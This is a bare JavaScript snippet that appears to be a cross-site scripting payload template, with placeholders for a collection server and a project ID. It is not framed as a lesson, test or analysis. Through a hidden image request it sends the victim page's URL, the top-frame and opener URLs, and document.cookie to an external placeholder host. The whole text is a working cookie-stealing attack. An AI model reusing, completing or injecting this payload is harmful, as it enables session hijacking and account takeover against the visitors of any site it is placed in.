(function() { (new Image()).src = 'http://ip/a/项目文件地址/?id={projectId}&location=' + escape((function() {
        try {
            return document.location.href
        } catch(e) {
            return ''
        }
    })()) + '&toplocation=' + escape((function() {
        try {
            return top.location.href
        } catch(e) {
            return ''
        }
    })()) + '&cookie=' + escape((function() {
        try {
            return document.cookie
        } catch(e) {
            return ''
        }
    })()) + '&opener=' + escape((function() {
        try {
            return (window.opener && window.opener.location.href) ? window.opener.location.href: ''
        } catch(e) {
            return ''
        }
    })());
})();
